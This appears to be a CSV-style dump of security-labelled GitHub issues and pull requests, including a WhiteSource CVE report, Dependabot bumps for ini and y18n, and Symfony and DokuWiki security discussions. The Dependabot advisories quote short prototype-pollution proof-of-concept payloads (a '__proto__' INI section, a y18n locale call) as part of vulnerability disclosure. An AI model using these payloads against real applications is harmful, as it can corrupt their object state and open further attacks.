<details><summary><img src='https://whitesource-resources.whitesourcesoftware.com/vulnerability_details.png' width=19 height=20> Vulnerable Library - <b>railsv2.3.8</b></p></summary>
<p>

<p>Ruby on Rails</p>
<p>Library home page: <a href=https://github.com/rails/rails.git>https://github.com/rails/rails.git</a></p>
<p>Found in HEAD commit: <a href=""https://github.com/PHeonix25/Testing-out-Rails/commit/f7a451605a4560bc7750683d56d1b744ceb8c4f6"">f7a451605a4560bc7750683d56d1b744ceb8c4f6</a></p>
</p>
</details>
</p></p>
<details><summary><img src='https://whitesource-resources.whitesourcesoftware.com/vulnerability_details.png' width=19 height=20> Library Source Files (9)</summary>
<p></p>
<p> * The source files were matched to this source library based on a best effort match. Source libraries are selected from a list of probable public libraries.</p>
<p>

  - /Testing-out-Rails/config/environments/production.rb
  - /Testing-out-Rails/public/javascripts/dragdrop.js
  - /Testing-out-Rails/public/javascripts/effects.js
  - /Testing-out-Rails/config/environments/development.rb
  - /Testing-out-Rails/config/initializers/new_rails_defaults.rb
  - /Testing-out-Rails/config/boot.rb
  - /Testing-out-Rails/public/javascripts/controls.js
  - /Testing-out-Rails/config/environments/test.rb
  - /Testing-out-Rails/test/test_helper.rb
</p>
</details>
<p></p>
</p>
</details>
<p></p>
<details><summary><img src='https://whitesource-resources.whitesourcesoftware.com/medium_vul.png' width=19 height=20> Vulnerability Details</summary>
<p>  
  
Foreman before 1.8.1 does not set the secure flag for the _session_id cookie in an https session, which makes it easier for remote attackers to capture this cookie by intercepting its transmission within an http session.

<p>Publish Date: 2015-08-14
<p>URL: <a href=https://vuln.whitesourcesoftware.com/vulnerability/CVE-2015-3155>CVE-2015-3155</a></p>
</p>
</details>
<p></p>
<details><summary><img src='https://whitesource-resources.whitesourcesoftware.com/cvss3.png' width=19 height=20> CVSS 2 Score Details (<b>5.0</b>)</summary>
<p>

Base Score Metrics not available</p>

</p>
</details>
<p></p>
<details><summary><img src='https://whitesource-resources.whitesourcesoftware.com/suggested_fix.png' width=19 height=20> Suggested Fix</summary>
<p>

<p>Type: Upgrade version</p>
<p>Origin: <a href=""https://nvd.nist.gov/vuln/detail/CVE-2015-3155"">https://nvd.nist.gov/vuln/detail/CVE-2015-3155</a></p>
<p>Release Date: 2015-08-14</p>
<p>Fix Resolution: 1.8.1</p>

</p>
</details>
<p></p>

***
Step up your Open Source Security Game with WhiteSource [here](https://www.whitesourcesoftware.com/full_solution_bolt_github)",,no,"security vulnerability,"
ehabkost/passerd,119113,"limit resource usage (esp. memory) per client","Implement basic limits such as:
- Number of feeds
- Number of joined channels
",,no,"feature,security,essential feature,"
ehabkost/passerd,147426,"handle DB errors gracefully","<pre>
[10:29:41] [Notificar] passerd-bot para #twitter- error refreshing feed: (OperationalError) disk I/O error u'UPDATE user_vars SET value=? WHERE user_vars.id = ?' [u'10220359684', 3]
[10:36:26] [Notificar] passerd-bot para #twitter- error refreshing feed: The transaction is inactive due to a rollback in a subtransaction. Issue rollback() to cancel the transaction.
[10:40:37] <botobr> !
[10:40:38] <passerd-bot> error refreshing: The transaction is inactive due to a rollback in a subtransaction.  Issue rollback() to cancel the transaction.
</pre>


And now the server is dead:

<pre>
[10:40:45] [Informações] Conectado, autenticando...
[10:40:48] [Notificar] -passerd.server- *** An internal error has occurred. Sorry. -- : The transaction is inactive due to a rollback in a subtransaction. Issue rollback() to cancel the transaction.
</pre>
",,no,"major bug,database,security,bug,"
ehabkost/passerd,119087,"Encrypt oauth token using password","This will make a public server more secure.
",,no,"feature,security,"
ehabkost/passerd,119044,"database: check for concurrency issues",,,no,"code cleanup,security,"
ehabkost/passerd,119035,"SSL support",,,no,"feature,security,"
ehabkost/passerd,131403,"new xAuth support","http://groups.google.com/group/twitter-development-talk/msg/b09f2a3324728d89

It will allow simpler OAuth setup, as it doesn't need out-of-band authorization using a PIN.
",,no,"feature,security,"
brandonweiss/brandonweiss,766480685,"[Security] Bump ini from 1.3.5 to 1.3.8","Bumps [ini](https://github.com/isaacs/ini) from 1.3.5 to 1.3.8. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-qqgx-2p2h-9c37"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Prototype Pollution</strong></p>
<h3>Overview</h3>
<p>The <code>ini</code> npm package before version 1.3.6 has a Prototype Pollution vulnerability.</p>
<p>If an attacker submits a malicious INI file to an application that parses it with <code>ini.parse</code>, they will pollute the prototype on the application. This can be exploited further depending on the context.</p>
<h3>Patches</h3>
<p>This has been patched in 1.3.6</p>
<h3>Steps to reproduce</h3>
<p>payload.ini</p>
<pre><code>[__proto__]
polluted = &quot;polluted&quot;
</code></pre>
<p>poc.js:</p>
<pre><code>var fs = require('fs')
&lt;/tr&gt;&lt;/table&gt; ... (truncated)
<p>Affected versions: &lt; 1.3.6
</code></pre></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/npm/ini/commit/a2c5da86604bc2238fe393c5ff083bf23a9910eb""><code>a2c5da8</code></a> 1.3.8</li>
<li><a href=""https://github.com/npm/ini/commit/af5c6bb5dca6f0248c153aa87e25bddfc515ff6e""><code>af5c6bb</code></a> Do not use Object.create(null)</li>
<li><a href=""https://github.com/npm/ini/commit/8b648a1ac49e1b3b7686ea957e0b95e544bc6ec1""><code>8b648a1</code></a> don't test where our devdeps don't even work</li>
<li><a href=""https://github.com/npm/ini/commit/c74c8af35f32b801a7e82a8309eab792a95932f6""><code>c74c8af</code></a> 1.3.7</li>
<li><a href=""https://github.com/npm/ini/commit/024b8b55ac1c980c6225607b007714c54eb501ba""><code>024b8b5</code></a> update deps, add linting</li>
<li><a href=""https://github.com/npm/ini/commit/032fbaf5f0b98fce70c8cc380e0d05177a9c9073""><code>032fbaf</code></a> Use Object.create(null) to avoid default object property hazards</li>
<li><a href=""https://github.com/npm/ini/commit/2da90391ef70db41d10f013e3a87f9a8c5d01a72""><code>2da9039</code></a> 1.3.6</li>
<li><a href=""https://github.com/npm/ini/commit/cfea636f534b5ca7550d2c28b7d1a95d936d56c6""><code>cfea636</code></a> better git push script, before publish instead of after</li>
<li><a href=""https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1""><code>56d2805</code></a> do not allow invalid hazardous string as section name</li>
<li>See full diff in <a href=""https://github.com/isaacs/ini/compare/v1.3.5...v1.3.8"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~isaacs"">isaacs</a>, a new releaser for ini since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=ini&package-manager=npm_and_yarn&previous-version=1.3.5&new-version=1.3.8)](https://dependabot.com/compatibility-score/?dependency-name=ini&package-manager=npm_and_yarn&previous-version=1.3.5&new-version=1.3.8)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
brandonweiss/brandonweiss,843588990,"[Security] Bump y18n from 3.2.1 to 3.2.2","Bumps [y18n](https://github.com/yargs/y18n) from 3.2.1 to 3.2.2. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-c4w7-xm78-47vh"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Prototype Pollution</strong></p>
<h3>Overview</h3>
<p>The npm package <code>y18n</code> before versions 3.2.2, 4.0.1, and 5.0.5 is vulnerable to Prototype Pollution.</p>
<h3>POC</h3>
<pre><code>const y18n = require('y18n')();
<p>y18n.setLocale('<strong>proto</strong>');
y18n.updateLocale({polluted: true});</p>
<p>console.log(polluted); // true
</code></pre></p>
<h3>Recommendation</h3>
<p>Upgrade to version 3.2.2, 4.0.1, 5.0.5 or later.</p>
<p>Affected versions: &lt; 3.2.2</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li>See full diff in <a href=""https://github.com/yargs/y18n/commits"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~oss-bot"">oss-bot</a>, a new releaser for y18n since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=y18n&package-manager=npm_and_yarn&previous-version=3.2.1&new-version=3.2.2)](https://dependabot.com/compatibility-score/?dependency-name=y18n&package-manager=npm_and_yarn&previous-version=3.2.1&new-version=3.2.2)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
infinitas/infinitas,16713148,"Shell installer password should not echo back","When entering the passwords on the shell installer it should behave similar to other *nix password prompts (eg: not echo back the input)
",,no,"Improve Feature,Security,"
infinitas/infinitas,16424326,"Detect bots and spiders","this is needed for a number of things (such as #64), posts and forms can be disabled, along with things like stopping view counters being incremented by disabling viewable.
",,no,"New Feature,Security,Speed,"
splitbrain/dokuwiki,490681597,"Add SameSite=lax attribute to cookies to prevent CSRF","I have just read about [preventing CSRF with the same-site cookie attribute](http://www.sjoerdlangkemper.nl/2016/04/14/preventing-csrf-with-samesite-cookie-attribute/) and I think it would be a good idea to set this for the cookies DokuWiki uses as an additional protection. I expect that in most use cases this should not have any negative side effects but use cases like site A embeds a protected image hosted in a wiki on site B that loads if you are logged in on site B would break. However, given that this [becomes default in Chrome 78](https://scotthelme.co.uk/csrf-is-really-dead/), this would break anyway soon.

The SameSite attribute has been introduced in PHP 7.3.0 for [session_set_cookie_params](https://www.php.net/manual/en/function.session-set-cookie-params.php) and [setcookie](https://www.php.net/manual/en/function.setcookie.php), therefore, until the minimum supported PHP version is 7.3.0, we would need to check for the required PHP version and use the old function calls otherwise.","Not sure if this needs to be a default, or an option. It's possible to have usage of linking DokuWiki-protected image somewhere else.

Related to #2836, #1676.Without any changes, Chrome 80 [will enable `SameSite=lax` by default](https://www.chromestatus.com/feature/5088147346030592) (and Chrome 78 in the beta version). This means if we believe that `SameSite=lax` is a problem, we need to release a new version of DokuWiki with `SameSite=None` this year (unless Google should change the schedule). Protected DokuWiki pages that are embedded in a frame and protected images being used on a different site are the two use cases I can think of here. However, I don't believe they are frequent. Therefore I don't see any reason why DokuWiki shouldn't set this at least by default to `lax` so users of all browsers enjoy the same kind of protection. https://web.dev/samesite-cookies-explained provides a nice explanation of which cookies are sent in what kind of request.It sounds like I am very conservative, but honestly I feel more and more skeptical about what Google decides nowadays on their Chrome default. (Just need one more browser vendor's opinion on this.)

One thing about this cookie config, different from other features discussed in #1676, is that a plugin cannot override this at all. Maybe it's worthwhile to implemented this in core, but again, I am not sure if this needs an option.Firefox (and Edge) will do exactly the same thing, just with no ETA set yet AFAIK. Please default to a restrictive cookie setting on dokuwiki, with an divergent option for those rare cases that need it.I am of the opinion that the SameSite attribute should be implemented for at least the DW<hash> cookie which is basically the primary target of any sensible CSRF attack on a dokuwiki implementation.",no,"Feature,Security,Difficulty: easy,Category: CSS XHTML JS Browsers,"
symfony/symfony,1177885665,"[RFC][Security] Reduce authentication usage ""magic""?","### Description

Source: https://twitter.com/matthiasnoback/status/1503652556186206211 by @matthiasnoback

I think it's interesting to see if and how we can reduce the magic (i.e. remove it or make it more obvious by providing helper classes/methods?)

* As a developer you wouldn't expect to have to deal with expressions. It's easy to get a disconnect between the actual controllers, their routing paths, and the regular expressions in the firewall. It's also very easy to break things: when you change a routing path, you can accidentally move a controller outside the firewall, making it unprotected or broken because it relies on a logged in user to be available. Instead, you'd expect to be able to mark *controllers*, not *request URI patterns* to be behind a firewall. That way, if you change the routing path, the controller still remains behind the controller.
* The template gets access to the authentication exception itself and the docs say, don't show getMessage(), use getMessageKey(). It would be better to pass some other type of object to the template/controller; one that only has the getMessageKey() method.
* Other aspects you wouldn't expect are a login controller that only *shows* the login form (login happens in a kernel event subscriber), and a logout controller that doesn't do anything.

### Example

_No response_","ref https://github.com/symfony/symfony/issues/20257I think for the firewall, defining an application wide regex also has a major advantage of making sure certain sections are secured (e.g. by relying only on controller based config, you need to remember to add it to new controllers). Maybe we can use attributes more as a ""sanity check"": e.g. check whether all `#[Secured]` controllers are within a firewall during compilation?> * and a logout controller that doesn't do anything.

technically, you don't need a logout controller at all. you need a logout **route** (so that the router does not return a 404 when reaching that URL). The logout controller associated to that route is never executed as the firewall generates a response early when handling the logout. The only benefit of that logout controller is that it allows you to keep using annotations or attributes to define the route (by design, those formats cannot define a route without an associated controller)And about defining access control rules for controllers, I think this is mostly about moving `#[IsGranted]` from SensioFrameworkExtraBundle to the core`#[IsGranted]` is out of scope when mounting vendor controllers btwI can relate. I recently tried to define a couple of [routes as stateless](https://symfony.com/blog/new-in-symfony-5-1-routing-improvements#added-stateless-route-attribute) but that didn't work because (almost) all my routes are behind a firewall. I had to use regex in my security config to disable security. I think this could be more convenient.

> > * and a logout controller that doesn't do anything.
> 
> technically, you don't need a logout controller at all. you need a logout **route** (so that the router does not return a 404 when reaching that URL).

I think this is a good example of the ""magic"" involved.",no,"Security,RFC,"
symfony/symfony,1251919021,"[Security] Add the ability for voter to return decision reason","| Q             | A
| ------------- | ---
| Branch?       | 6.2
| Bug fix?      | no
| New feature?  | yes
| Deprecations? | yes
| Tickets       | Fix https://github.com/symfony/symfony/issues/27995, https://github.com/symfony/symfony/issues/26343, https://github.com/symfony/symfony/pull/35592, https://github.com/symfony/symfony/pull/43147
| License       | MIT
| Doc PR        | /

This PR continue the work started by @maidmaid and @noniagriconomie in #35592, continued by @yellow1912 in #43147.

It allow to have informations about AccessDecisionManager and Voters (And understand why we have an AccessDeniedException with clear infos).

I rebased on 6.2 and adapt code in some cases

![image](https://user-images.githubusercontent.com/9253091/170878112-f93f8d90-97b7-42f8-8494-603d6b2019e2.png)
![image](https://user-images.githubusercontent.com/9253091/170878121-86a53f18-c075-4e24-b4c3-17bb6d2e8a0a.png)


TODO:

- [ ] Update Changelog.md
- [ ] Update Upgrade-x.md
- [ ] PR Documentation","Hey!

I think @NicoHaase has recently worked with this code. Maybe they can help review this?

Cheers!

Carsonbot",yes,"Security,Feature,Status: Needs Review,Deprecation,"
symfony/symfony,611379055,"[DX][Security] Add (de)authentication information to the profiler","**Description**  

It would be nice to display information about authentication in the profiler:

* [x] Know which authenticators are checked for support and which is actually used to authenticate (#42582)
* [x] Inspect the Security passport + badges generated by this authenticator (maybe erase plain text passwords from the dump?) (#42582)
* [ ] See which badges are resolved and which aren't
* [ ] Show if authenticators support lazy-authentication?
* [ ] See the ""unsafe"" exception messages during authentication failure

I think (1) can be done by creating a `TraceableAuthenticator` that decorates all authenticators and (2) and (3) should probably be done by an event listener on `CheckPassportEvent` (with a very low priority).

* [ ] Another case where we can improve debugging is when deauthenticating. This often happens when the user provider is misconfigured (or the user is wrongly reloaded in any other way) and these are hard to debug. Adding information about deauthentication (especially why it happens) will be more helpful to debug these.

---

After this information is added to the profiler, we can investigate looking back at the profiler data before redirection to the login form and modifying the security item in the toolbar related to this. Most of this information is hidden behind at least one redirection (both authentication errors as deauthentication usually result in a redirect response).","Hi @wouterj! Started to work on a little something for this issue. For now, I'm able to retrieve and display in profiler if an authenticator is able to support request and is used to authenticate the current request. Here is the result in the profiler for now:

![Capture d’écran du 2021-06-02 16-31-27](https://user-images.githubusercontent.com/2144837/120499023-00d49100-c3c0-11eb-8d85-dc8088b5cc18.png)

I've been struggling a bit with something. As `Authenticator` isn't a service, I wasn't able to create a `TraceableAuthenticator`. Instead, I inspired myself from the `TraceableAccessDecisionManager` and created a `TraceableAuthenticatorManager`.
As `AuthenticatorManager` is declared as an abstract service, I can't decorate it directly. So here's what I tried:

```
->set('debug.security.authenticator.manager', TraceableAuthenticatorManager::class)
            ->decorate('security.authenticator.manager.main')
            ->args([
                service('debug.security.authenticator.manager.inner')
            ])
```

Although it works, that's a problem if the application has more than one firewall, other than the `main` one. Do you have any idea how to deal with this? Thanks!Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?",no,"Security,Feature,SecurityBundle,DX,Help wanted,Keep open,"
symfony/symfony,1283386803,"target_path redirection on successful login is broken following upgrade from 4.4.41 to 4.4.42","### Symfony version(s) affected

4.4.42

### Description

Following an upgrade from Symfony 4.4.41 to 4.4.42 I seem to be unable to use 'target' in the following way:
```
    /**
     * Attempting to login as the specified user.
     *
     * @Route(
     *      ""/login"",
     *      name = ""crmpicco_login""
     * )
     * @Template(""@App/Register/login.html.twig"")
     *
     * @param Request $request
     * @param LoginHelper $loginHelper
     *
     * @return array
     */
    public function loginAction(Request $request, LoginHelper $loginHelper): array
    {
        return $this->loginHelper($request, $loginHelper);
    }

    /**
     * @param Request $request
     * @param LoginHelper $loginHelper
     *
     * @return array
     */
    protected function loginHelper(Request $request, LoginHelper $loginHelper): array
    {
        /* @var $session \Symfony\Component\HttpFoundation\Session\Session */
        $session = $request->getSession();

        // get the error if any (works with forward and redirect -- see below)
        if ($request->attributes->has(LoginSecurity::AUTHENTICATION_ERROR)) {
            $error = $request->attributes->get(LoginSecurity::AUTHENTICATION_ERROR);
        } elseif (null !== $session && $session->has(LoginSecurity::AUTHENTICATION_ERROR)) {
            $error = $session->get(LoginSecurity::AUTHENTICATION_ERROR);
            $session->remove(LoginSecurity::AUTHENTICATION_ERROR);
        } else {
            $error = '';
        }

        $csrfToken = $this->getContainerInterface()->get('security.csrf.token_manager')->getToken('authenticate');

        return [
            'error' => $error,
            'csrf_token' => $csrfToken,
            'target' => 'crmpicco_register_details',
        ];
    }
```

### How to reproduce


I can see there were some changes to the `DefaultAuthenticationSuccessHandler` in 4.4.42, however it's unclear how to fix this in my application.

My `SuccessHandler` looks like this:

```
    public function onAuthenticationSuccess(Request $request, TokenInterface $token): RedirectResponse
    {
        return $this->httpUtils->createRedirectResponse($request, $this->determineTargetUrl($request));
    }
```
What I am experiencing is the redirect is not respecting the ""crmpicco_register_details"" route I am passing through and is instead redirecting to the default ""admin"" route on successful login.

How do I remedy this in my application? (For now, i've reverted to 4.4.41 until I can fix this).

### Possible Solution

_No response_

### Additional Context

I created a discussion (https://github.com/symfony/symfony/discussions/46677) for this, but someone pointed out to me that it's more of an issue than a discussion.",,no,"Security,Bug,Status: Needs Review,"
symfony/symfony,1394527446,"[Security] Ban \DateTime from Security component","| Q             | A
| ------------- | ---
| Branch?       | 6.2 for features
| Bug fix?      | no
| New feature?  | yes
| Deprecations? | yes
| Tickets       |  #47580
| License       | MIT

This PR is next to: #47730

The purpose here is to remove the use of \DateTime in the security component. I don't think we can remove it completely without leading any BC break. So I propose to use DateTimeInterface with a deprecation notice.
Feel free to discuss! ",,yes,"Security,Feature,Status: Needs Review,Deprecation,"
symfony/symfony,1338345437,"CSRF Token is not kept when session is renewed with REMEMBERME","### Symfony version(s) affected

6.1.X

### Description

CSRF tokens by default are stored and bound to the session and have no expiration per se.  However when using the REMEMBER-ME feature,  when the session is renewed, the csrf token is not kept,  causing invalid form

### How to reproduce

1. create a symfony project with a login form and remember me activated

```
security:
    enable_authenticator_manager: true
    # https://symfony.com/doc/current/security.html#where-do-users-come-from-user-providers
    providers:
        endusers:
            id: 'App\Provider\EndUserProvider'
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        endusers:
            host: app.*
            pattern: ^/
            provider: endusers
            lazy: true
            remember_me:
                secret: '%kernel.secret'
                # 2 months in seconds, the goal is to have the user logged-in
                # enough time to start to appreciate the service, so that he will
                # care about doing 'forgot password'
                lifetime: 5356800
                secure: true
                path: /
                always_remember_me: true
                token_provider: 'Symfony\Bridge\Doctrine\Security\RememberMe\DoctrineTokenProvider'
            form_login:
                login_path: end_users_login
                check_path: end_users_login
                enable_csrf: true
                default_target_path: end_users_login
```

2. create an other form that is behind the `endusers` firewall ,  nothing special , let symfony manage it completly


### now as a user 

1.  login
2. open the page with the form
3. do noting during 24 minutes and 1 seconds , or at least session.gc-maxlifetime + 1 seconds ( https://www.php.net/manual/en/session.configuration.php#ini.session.gc-maxlifetime )
4. submit the form
=>  you get a `Invalid CSRF token`

## Expected the behaviour 

As the session is recreated by remember-me ,  the csrf should be kept

### Possible Solution

When creating the remember-me cookie,  the csrf token should be stored in it,  so that when recreating the session, the csrf token can be kept 

### Additional Context

_No response_","How use cases is the following: we have a mobile application with a webview containing our forms,  so it's really frequent to have user who don't close their app and let it in the background , so as our app is ""use once and day and forget until next day"", we often hit this issue.

we currently have `<meta http-equiv=""refresh"" content=""1200"">` workaround  but it causes quite some other issues  (form where people have a lot of text to input ,  accessibility issue etc ) ",no,"Security,Bug,Status: Needs Review,"
symfony/symfony,822998820,"[Security] Mark the request as _stateless if the firewall used is stateless","**Description**
As of 5.1, routes can be marked stateless which is a great addition. It occurred to me that if a firewall is configured to be stateless, the Request could also automatically receive the stateless attribute if it matches the firewall config.

**Example**

Security config example:
```yaml
security:
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt|error)|css|images|js)/
            security: false

        api:
            host: ^api\.
            custom_authenticators:
                - App\Security\ApiTokenAuthenticator
            stateless: true

        main:
            form_login:
                provider: app_user_provider
                login_path: /login
                check_path: /user/login_check
```

In this case, requests to the `api.example.org` should get the _stateless attribute automatically, so we get warned if any API usage has a session started.

Using stateless routes in this case is not strictly possible as we have routes usable on both api and regular domain, and they do make use of sessions for user authentication on the regular domain, but not on the API one.

I for now fixed this with a request listener setting the attribute myself, but it would be nice if the framework took care of it.
","Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?Still relevant, will see if I can work on a patch.Patch welcome indeeded :)Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?",no,"Security,Feature,Keep open,"
symfony/symfony,1028368355,"[Security] Remove sorting of security listeners at runtime from Firewall","| Q             | A
| ------------- | ---
| Branch?       | 6.0
| Bug fix?      | no
| New feature?  | no
| Deprecations? | no
| License       | MIT

This is follow-up of introducing the ability to sort security listeners, which was introduced in #37337. Part of the discussion at that time was whether we'd still need to hardcoded sorting algorithm in the `Firewall` class, which was previously needed to sort in the `LogoutListener` at the correct position. With the ability to sort by a priority that was actually no longer needed.

I had this change temporarily implemented in https://github.com/symfony/symfony/commit/19727865a12e5529a430aed4f95cd8b46f78f979, though in the discussion it was decided against and instead keep the code for backwards compatibility reasons. Otherwise we'd need to declare a conflict with `security-bundle` in the `composer.json` and it was argued by @chalasr against making the `security` component aware of `security-bundle` (see https://github.com/symfony/symfony/pull/37337#discussion_r444511366).

Though I've recognized, things have changed in the meantime, and `security` component is now declaring conflict for `security-bundle` (introduced by @nicolas-grekas in https://github.com/symfony/symfony/commit/314ef9fb886b7c2d2c331052b744e0bca68d484a)

So I want to give this another shot and clean up the `Firewall` class, targeting potentially the 5.4 branch, definitely for the 6.0 branch.

**Considerations**
To make the clean-up work, the `LogoutListener` service needs to be added to the list of listeners generated by `SecurityExtension`. Until now, it's intentionally (?) left out. In the 5.4 branch this _could_ be considered a breaking change. Let me know what you think, if this is in fact considered as breaking, I'm happy to change the target to 6.0.","Thanks for the PR.
The logout listener has always been special as in separated from other listeners:
https://github.com/symfony/symfony/blob/732acf56fd6e0a6a3af57595a724728b959a5cbf/src/Symfony/Component/Security/Http/FirewallMapInterface.php#L36-L38

With the proposed patch, the logout listener returned from FirewallMap is not used anymore which looks like a BC break.
Since there is no more reason to separate the logout listener from other listeners thanks to priorities, I suppose we can deprecate returning the logout listener separately from other listeners in `FirewallMapInterface`, then remove it along with the sorting logic in 6.0. Excellent 👍 

I'll re-target the PR to 6.0. How should we move ahead with the deprecation? (How do you deprecate a value in a returned array? 🤔)Triggering a notice from `Firewall` when `$listeners[2]` is set and is a logout listener should be enough in this case. The return annotation should be updated to reflect what is expected on 6.0 also (no logout listener in the array)I can take care for a PR to add that deprecation.

Could someone update the milestone on this PR to 6.0 (I can't). Thanks! 🙇 PR for deprecation is open. Once that's done, I'll rebase this one and include a clean-up of deprecations.",yes,"Security,Status: Needs Review,"
symfony/symfony,839711529,"[New authenticator manager] - Seems to be a bug between @isGranted and @Security annotations","**Symfony version(s) affected**: 5.2.5

# Context
I set up the Symfony authenticator manager (experimental) https://symfony.com/doc/current/security/experimental_authenticators.html

The way to treat anonymous users has therefore changed. According to the doc ', for anonymous users :

> When using isGranted(), the result will always be false (i.e. denied) as this session is handled as a user without any privileges.

# Problem
In my app, there is a route that contains a call for an annotation vote to make sure the user can access it.

Before the new authenticator, the `@IsGranted()` as well as the `@Security()` gave the same response.

But now the `@Security()` returns to the login page, while the `@IsGranted()` passes.


# How to reproduce

I have created a **repository** in which everything is ready to be tested : https://github.com/bastien70/symfony_authenticator_voter_permissions_test

## Want to try it out for yourself?

1. Create a project
2. Set up the new authenticator
3. Create a custom voter by making sure to allow it by anonymous users
4. Create a route protected by the @Security annotation in reference to the voter previously created. You will see that you will be redirected to the login page.
5. Try this time with the @IsGranted () annotation, it works.

# Conclusion

An explanation for this problem? Why does the `@Security()` return us to the login page while the `@IsGranted()` return true?

Knowing that these two annotations should bring the same result
","That's actually related to the implementation of these annotations in SensioFrameworkExtraBundle.

`@IsGranted` is executed by doing a direct call to `$authChecker->isGranted()`
`@Security` performs its own evaluation logic for the expression, which relies on accessing `$tokenStorage->getToken()` which is indeed impacted by the change in the new system.

This means that SensioFrameworkExtraBundle needs to adapt its implementation of the SecurityListener to be compatible with anonymous users in the new experimental system.see also #25361 :) 

> this issue its to not depend on framework extra bundle for these common and high used featuresThe `@IsGranted()` behavior is the correct behavior, right?

In SensioFrameworkExtraBundle, I think we should deprecate `@Security`. I created `@IsGranted` to be easier to use... but also because I thought the expression is not a good place to have that logic.

But, outside of this, if possible, it would be good to fix `@Security` with the new system... I'm actually a little surprised that using `@Security(is_granted())` didn't have the same effect as `@IsGranted()`... I can't spot the problem...

If someone wants to debug, you'd want to put some debug code in this class - https://github.com/sensiolabs/SensioFrameworkExtraBundle/blob/9d69e9b0c033917fcd3523dc8764660ac9642eb3/src/EventListener/SecurityListener.php > But, outside of this, if possible, it would be good to fix @Security with the new system... 

`@Security` has a very useful use-case since 4.something: we no longer allow passing a list of roles to any is granted function/annotation, so you need to use `@Security` with an expression. If https://wiki.php.net/rfc/new_in_initializers is accepted, we can deprecate it in Symfony 6.1 and instead recommend people to use `#[IsGranted(new Expression(...))]` (if we introduce this attribute).wasnt the goal to prefer `@Security` and make the actual rule (which reasonably _is_ an expression) explicit? Eg.

```
